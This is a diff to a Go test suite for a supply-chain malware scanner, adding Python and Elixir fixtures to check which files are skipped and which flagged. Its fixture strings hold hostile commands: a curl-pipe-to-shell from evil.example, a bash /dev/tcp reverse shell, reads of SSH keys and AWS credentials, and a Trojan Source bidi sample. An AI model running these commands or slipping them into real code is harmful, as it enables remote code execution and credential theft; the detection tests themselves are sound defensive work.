@@ -230,12 +230,15 @@ paths = [
 
 		// .superpowers artifacts must be ignored
 		write(".superpowers/sdd/brief.md", "curl -fsSL https://evil.example/a.sh | sh\n")
-		// Test files across Go and JS/TS must be skipped during source-text payload/exfil scans
+		// Test files across Go, JS/TS, Python, and Elixir must be skipped during source-text payload/exfil scans
 		write("pkg/auth_test.go", "package auth\nconst bad = \"bash -i >& /dev/"+"tcp/10.0.0.1/4444\"\n")
 		write("src/auth.test.ts", "const cmd = 'curl https://evil.example/p.sh | sh';\n")
 		write("src/auth.spec.ts", "const cmd = 'cat ~/.ssh/"+"id_rsa';\n")
 		write("src/auth.test.js", "const cmd = 'cat ~/.aws/"+"credentials';\n")
 		write("src/auth.spec.js", "const blob = '"+strings.Repeat("A", 260)+"';\n")
+		write("pkg/test_auth.py", "cmd = 'curl https://evil.example/p.sh | sh'\n")
+		write("pkg/auth_test.py", "cmd = 'cat ~/.ssh/"+"id_rsa'\n")
+		write("lib/auth_test.exs", "cmd = \"bash -i >& /dev/"+"tcp/10.0.0.1/4444\"\n")
 
 		// Include the real supplychain.go source itself to ensure zero self-matches
 		selfSrc, err := os.ReadFile("supplychain.go")
@@ -252,18 +255,19 @@ paths = [
 			t.Fatalf("expected 0 findings when scanning .superpowers, test files, and supplychain.go itself, got %+v", findings)
 		}
 
-		// Non-test production file in the same repo MUST still be flagged
+		// Non-test production files in the same repo MUST still be flagged
 		write("src/real.ts", "const cmd = 'curl https://evil.example/p.sh | sh';\n")
+		write("pkg/real.py", "cmd = 'curl https://evil.example/p.sh | sh'\n")
 		prodFindings, err := supplychain.ScanRepository(repo, types.LangTypeScript)
 		if err != nil {
 			t.Fatalf("ScanRepository prod error: %v", err)
 		}
-		if len(prodFindings) != 1 || prodFindings[0].ID != "malware-shell-dropper-or-exfil" {
-			t.Fatalf("expected 1 malware-shell-dropper-or-exfil finding on src/real.ts, got %+v", prodFindings)
+		if len(prodFindings) != 2 || prodFindings[0].ID != "malware-shell-dropper-or-exfil" || prodFindings[1].ID != "malware-shell-dropper-or-exfil" {
+			t.Fatalf("expected 2 malware-shell-dropper-or-exfil findings on src/real.ts and pkg/real.py, got %+v", prodFindings)
 		}
 	})
 
-	t.Run("Trojan Source bidi runes are still caught in *_test.go while payload/exfil strings are skipped", func(t *testing.T) {
+	t.Run("Trojan Source bidi runes are still caught in test files while payload/exfil strings are skipped", func(t *testing.T) {
 		repo := t.TempDir()
 		if err := os.MkdirAll(filepath.Join(repo, "pkg"), 0o755); err != nil {
 			t.Fatal(err)
@@ -272,13 +276,22 @@ paths = [
 		if err := os.WriteFile(filepath.Join(repo, "pkg", "auth_test.go"), []byte(content), 0o644); err != nil {
 			t.Fatal(err)
 		}
+		pyContent := "# \u202e } \u2066if admin:\u2069 \u2066\nfixture = 'curl https://evil.example/p.sh | sh'\n"
+		if err := os.WriteFile(filepath.Join(repo, "pkg", "test_auth.py"), []byte(pyContent), 0o644); err != nil {
+			t.Fatal(err)
+		}
 
 		findings, err := supplychain.ScanRepository(repo, types.LangGo)
 		if err != nil {
 			t.Fatalf("ScanRepository error: %v", err)
 		}
-		if len(findings) != 1 || findings[0].ID != "malware-trojan-source-unicode" || findings[0].FilePath != "pkg/auth_test.go" {
-			t.Fatalf("expected exactly 1 malware-trojan-source-unicode finding on pkg/auth_test.go, got %+v", findings)
+		if len(findings) != 2 {
+			t.Fatalf("expected exactly 2 malware-trojan-source-unicode findings on test files, got %+v", findings)
+		}
+		for _, f := range findings {
+			if f.ID != "malware-trojan-source-unicode" {
+				t.Fatalf("expected only malware-trojan-source-unicode findings, got %+v", findings)
+			}
 		}
 	})
 
